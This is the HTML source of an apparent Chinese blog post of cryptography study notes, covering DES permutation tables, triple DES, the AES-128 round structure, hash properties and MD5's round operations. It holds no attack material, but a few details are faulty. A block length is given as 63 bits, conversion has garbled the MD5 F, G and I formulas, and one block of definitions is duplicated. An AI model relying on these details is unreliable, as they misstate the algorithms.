      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;26&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;31&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;32&lt;/td&gt;
      &lt;td&gt;27&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;13&lt;/td&gt;
      &lt;td&gt;30&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;表中的数字代表原数据中此位置的数据在新数据中的位置，即原数据块的第16位放到新数据的第1位，第7位放到第2位，……依此类推，第25位放到第32位。&lt;/p&gt;

&lt;p&gt;例如0x10A1 0001进行P盒置换后变为0x8000 0886。&lt;/p&gt;

&lt;p&gt;最后，P盒置换的结果与最初的64位分组左半部分L0异或，然后左、右半部分交换，接着开始另一轮。&lt;/p&gt;

&lt;h2 id=&quot;ip-1末置换&quot;&gt;IP-1末置换&lt;/h2&gt;

&lt;p&gt;末置换是初始置换的逆过程，DES最后一轮后，左、右两半部分并未进行交换，而是两部分合并形成一个分组做为末置换的输入。末置换规则如下表：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;40&lt;/th&gt;
      &lt;th&gt;8&lt;/th&gt;
      &lt;th&gt;48&lt;/th&gt;
      &lt;th&gt;16&lt;/th&gt;
      &lt;th&gt;56&lt;/th&gt;
      &lt;th&gt;24&lt;/th&gt;
      &lt;th&gt;64&lt;/th&gt;
      &lt;th&gt;32&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;39&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;47&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;55&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;63&lt;/td&gt;
      &lt;td&gt;31&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;38&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;46&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;54&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;62&lt;/td&gt;
      &lt;td&gt;30&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;37&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;45&lt;/td&gt;
      &lt;td&gt;13&lt;/td&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;61&lt;/td&gt;
      &lt;td&gt;29&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;36&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;44&lt;/td&gt;
      &lt;td&gt;12&lt;/td&gt;
      &lt;td&gt;52&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;60&lt;/td&gt;
      &lt;td&gt;28&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;35&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;43&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;51&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;59&lt;/td&gt;
      &lt;td&gt;27&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;34&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;42&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;50&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;58&lt;/td&gt;
      &lt;td&gt;26&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;33&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;41&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;49&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;57&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;置换方法同上，此处省略。&lt;/p&gt;

&lt;h2 id=&quot;des安全性&quot;&gt;DES安全性&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;互补性&lt;/li&gt;
  &lt;li&gt;弱秘钥&lt;/li&gt;
  &lt;li&gt;迭代轮数&lt;/li&gt;
  &lt;li&gt;秘钥长度&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3重des&quot;&gt;3重DES&lt;/h2&gt;

&lt;p&gt;优点:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;秘钥长度增加到112位或168为,有效克服穷举&lt;/li&gt;
  &lt;li&gt;相对于DES,增强了抗差分分析和线性分析&lt;/li&gt;
  &lt;li&gt;DES升级到3重DES成本低&lt;/li&gt;
  &lt;li&gt;对密码分析攻击由很强的免疫力&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不足:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;处理速度慢&lt;/li&gt;
  &lt;li&gt;秘钥长度增加了,但是明文分组的长度没有变化,任为63位,就效率和安全性与秘钥的增长不匹配&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;des分析方法&quot;&gt;DES分析方法&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;穷举&lt;/li&gt;
  &lt;li&gt;差分分析&lt;/li&gt;
  &lt;li&gt;线性分析&lt;/li&gt;
  &lt;li&gt;积分攻击&lt;/li&gt;
  &lt;li&gt;中间相遇攻击&lt;/li&gt;
  &lt;li&gt;相关秘钥攻击&lt;/li&gt;
  &lt;li&gt;侧信道攻击&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;aes&quot;&gt;AES&lt;/h1&gt;

&lt;h2 id=&quot;aes的基本结构&quot;&gt;AES的基本结构&lt;/h2&gt;

&lt;p&gt;AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;AES&lt;/th&gt;
      &lt;th&gt;密钥长度（32位比特字)&lt;/th&gt;
      &lt;th&gt;分组长度(32位比特字)&lt;/th&gt;
      &lt;th&gt;加密轮数&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-128&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-192&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;12&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AES-256&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。
AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。&lt;/p&gt;

&lt;p&gt;AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：
&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES.png&quot; alt=&quot;AES&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES1.png&quot; alt=&quot;AES1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。&lt;/p&gt;

&lt;p&gt;类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES2.jpeg&quot; alt=&quot;AES2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。&lt;/p&gt;

&lt;p&gt;AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。&lt;/p&gt;

&lt;h2 id=&quot;字节代换&quot;&gt;字节代换&lt;/h2&gt;

&lt;p&gt;AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/AES_s.png&quot; alt=&quot;AES_s&quot; /&gt;&lt;/p&gt;

&lt;p&gt;状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：
&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/字节变换.png&quot; alt=&quot;字节变换&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;字节代换逆操作&quot;&gt;字节代换逆操作&lt;/h2&gt;

&lt;p&gt;逆字节代换也就是查逆S盒来变换,此处不展示&lt;/p&gt;

&lt;h2 id=&quot;行移位&quot;&gt;行移位&lt;/h2&gt;

&lt;p&gt;行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/行位移.jpeg&quot; alt=&quot;行位移&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;行移位的逆变换&quot;&gt;行移位的逆变换&lt;/h2&gt;

&lt;p&gt;行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。&lt;/p&gt;

&lt;h2 id=&quot;列混合&quot;&gt;列混合&lt;/h2&gt;

&lt;p&gt;列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/列混合.png&quot; alt=&quot;列混合&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;列混合逆运算&quot;&gt;列混合逆运算&lt;/h2&gt;

&lt;p&gt;逆向列混合变换可由下图的矩阵乘法定义&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/Documents/verylazycat.github.io/img/列混合逆.png&quot; alt=&quot;列混合逆&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;轮秘钥加&quot;&gt;轮秘钥加&lt;/h2&gt;

&lt;p&gt;轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作&lt;/p&gt;

&lt;p&gt;轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。&lt;/p&gt;

&lt;h2 id=&quot;秘钥扩展&quot;&gt;秘钥扩展&lt;/h2&gt;

&lt;h2 id=&quot;aes解密&quot;&gt;AES解密&lt;/h2&gt;

&lt;h1 id=&quot;hash函数&quot;&gt;Hash函数&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;消息空间到像空间的不可逆映射&lt;/p&gt;

  &lt;p&gt;像通常叫数字指纹,消息摘要,散列值&lt;/p&gt;
&lt;/blockquote&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;h=H(M)&lt;/script&gt;

&lt;h2 id=&quot;性质&quot;&gt;性质&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;H可应用于&lt;code&gt;任意&lt;/code&gt;长度的消息&lt;/li&gt;
  &lt;li&gt;H输出固定长度&lt;/li&gt;
  &lt;li&gt;对于任意给定消息x,计算H(x)比较容易,用硬件和软件均可实现&lt;/li&gt;
  &lt;li&gt;单向性:对于给定散列值h,找到H(x)=h的消息x在计算上不可行&lt;/li&gt;
  &lt;li&gt;抗弱碰撞性:对于给定的消息x,找到满足y!=x且H(x)=H(y)的消息y在计算上不可行&lt;/li&gt;
  &lt;li&gt;抗强碰撞性:找到满足H(x)=H(y)的偶对(x,y)在计算上不可行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;应用&quot;&gt;应用&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;数字签名&lt;/li&gt;
  &lt;li&gt;生成程序或文档的”数字指纹”&lt;/li&gt;
  &lt;li&gt;用于安全传输和存储口令&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;md5&quot;&gt;MD5&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;单向散列算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;功能&quot;&gt;功能&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;输入任意长度的信息，经过处理，输出为128位的信息（数字指纹）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不同的输入得到的不同的结果（唯一性）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据128位的输出结果不可能反推出输入的信息（不可逆）；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;算法&quot;&gt;算法&lt;/h3&gt;

&lt;h4 id=&quot;填充&quot;&gt;&lt;strong&gt;填充&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，&lt;strong&gt;并且填充必须进行，即使其位长对512求余的结果等于448&lt;/strong&gt;。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。&lt;/p&gt;

&lt;p&gt;填充的方法如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;进制表示的填充前信息长度超过64位，则取低64位。&lt;/p&gt;

&lt;p&gt;经过这两步的处理，信息的位长=N&lt;em&gt;512+448+64=(N+1）&lt;/em&gt;512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。&lt;/p&gt;

&lt;h4 id=&quot;初始化变量&quot;&gt;&lt;strong&gt;初始化变量&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%E5%AD%97%E8%8A%82%E5%BA%8F&quot;&gt;字节序&lt;/a&gt;来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。&lt;/p&gt;

&lt;p&gt;（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）&lt;/p&gt;

&lt;h4 id=&quot;处理分组数据&quot;&gt;&lt;strong&gt;处理分组数据&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;每一分组的算法流程如下：&lt;/p&gt;

&lt;p&gt;第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d。&lt;/p&gt;

&lt;p&gt;主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左&lt;strong&gt;环移&lt;/strong&gt;一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。&lt;/p&gt;

&lt;p&gt;以下是每次操作中用到的四个非线性函数（每轮一个）&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;F( X ,Y ,Z ) = ( X &amp;amp; Y )&lt;/td&gt;
      &lt;td&gt;( (~X) &amp;amp; Z )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;G( X ,Y ,Z ) = ( X &amp;amp; Z )&lt;/td&gt;
      &lt;td&gt;( Y &amp;amp; (~Z) )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;H( X ,Y ,Z ) =X ^ Y ^ Z&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;I( X ,Y ,Z ) =Y ^ ( X&lt;/td&gt;
      &lt;td&gt;(~Z) )&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;（&amp;amp;是与（And），&lt;/td&gt;
      &lt;td&gt;是或（Or），~是非（Not），^是异或（Xor））&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。&lt;/p&gt;

&lt;p&gt;F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。&lt;/p&gt;

&lt;p&gt;假设Mj表示消息的第j个子分组（从0到15），常数ti是4294967296*abs( sin(i) ）的整数部分，i 取值从1到64，单位是弧度。（4294967296=2的32次方）&lt;/p&gt;

&lt;p&gt;现定义：&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;现定义：&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,Mj ,s ,ti ) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) « s)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意：“«”表示循环左移位，不是左移位。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这四轮（共64步）是：&lt;/p&gt;

&lt;p&gt;第一轮&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M0 ,7 ,0xd76aa478 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M1 ,12 ,0xe8c7b756 )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M2 ,17 ,0x242070db )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M3 ,22 ,0xc1bdceee )&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M4 ,7 ,0xf57c0faf )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M5 ,12 ,0x4787c62a )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M6 ,17 ,0xa8304613 )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M7 ,22 ,0xfd469501)&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M8 ,7 ,0x698098d8 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M9 ,12 ,0x8b44f7af )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M10 ,17 ,0xffff5bb1 )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M11 ,22 ,0x895cd7be )&lt;/p&gt;

&lt;p&gt;FF(a ,b ,c ,d ,M12 ,7 ,0x6b901122 )&lt;/p&gt;

&lt;p&gt;FF(d ,a ,b ,c ,M13 ,12 ,0xfd987193 )&lt;/p&gt;

&lt;p&gt;FF(c ,d ,a ,b ,M14 ,17 ,0xa679438e )&lt;/p&gt;

&lt;p&gt;FF(b ,c ,d ,a ,M15 ,22 ,0x49b40821 )&lt;/p&gt;

&lt;p&gt;第二轮&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M1 ,5 ,0xf61e2562 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M6 ,9 ,0xc040b340 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M11 ,14 ,0x265e5a51 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M0 ,20 ,0xe9b6c7aa )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M5 ,5 ,0xd62f105d )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M10 ,9 ,0x02441453 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M15 ,14 ,0xd8a1e681 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M4 ,20 ,0xe7d3fbc8 )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M9 ,5 ,0x21e1cde6 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M14 ,9 ,0xc33707d6 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M3 ,14 ,0xf4d50d87 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M8 ,20 ,0x455a14ed )&lt;/p&gt;

&lt;p&gt;GG(a ,b ,c ,d ,M13 ,5 ,0xa9e3e905 )&lt;/p&gt;

&lt;p&gt;GG(d ,a ,b ,c ,M2 ,9 ,0xfcefa3f8 )&lt;/p&gt;

&lt;p&gt;GG(c ,d ,a ,b ,M7 ,14 ,0x676f02d9 )&lt;/p&gt;

&lt;p&gt;GG(b ,c ,d ,a ,M12 ,20 ,0x8d2a4c8a )&lt;/p&gt;

&lt;p&gt;第三轮&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M5 ,4 ,0xfffa3942 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M8 ,11 ,0x8771f681 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M11 ,16 ,0x6d9d6122 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M14 ,23 ,0xfde5380c )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M1 ,4 ,0xa4beea44 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M4 ,11 ,0x4bdecfa9 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M7 ,16 ,0xf6bb4b60 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M10 ,23 ,0xbebfbc70 )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M13 ,4 ,0x289b7ec6 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M0 ,11 ,0xeaa127fa )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M3 ,16 ,0xd4ef3085 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M6 ,23 ,0x04881d05 )&lt;/p&gt;

&lt;p&gt;HH(a ,b ,c ,d ,M9 ,4 ,0xd9d4d039 )&lt;/p&gt;

&lt;p&gt;HH(d ,a ,b ,c ,M12 ,11 ,0xe6db99e5 )&lt;/p&gt;

&lt;p&gt;HH(c ,d ,a ,b ,M15 ,16 ,0x1fa27cf8 )&lt;/p&gt;

&lt;p&gt;HH(b ,c ,d ,a ,M2 ,23 ,0xc4ac5665 )&lt;/p&gt;

&lt;p&gt;第四轮&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M0 ,6 ,0xf4292244 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M7 ,10 ,0x432aff97 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M14 ,15 ,0xab9423a7 )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M5 ,21 ,0xfc93a039 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M12 ,6 ,0x655b59c3 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M3 ,10 ,0x8f0ccc92 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M10 ,15 ,0xffeff47d )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M1 ,21 ,0x85845dd1 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M8 ,6 ,0x6fa87e4f )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M15 ,10 ,0xfe2ce6e0 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M6 ,15 ,0xa3014314 )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M13 ,21 ,0x4e0811a1 )&lt;/p&gt;

&lt;p&gt;II(a ,b ,c ,d ,M4 ,6 ,0xf7537e82 )&lt;/p&gt;

&lt;p&gt;II(d ,a ,b ,c ,M11 ,10 ,0xbd3af235 )&lt;/p&gt;

&lt;p&gt;II(c ,d ,a ,b ,M2 ,15 ,0x2ad7d2bb )&lt;/p&gt;

&lt;p&gt;II(b ,c ,d ,a ,M9 ,21 ,0xeb86d391 )&lt;/p&gt;

&lt;p&gt;所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。&lt;/p&gt;

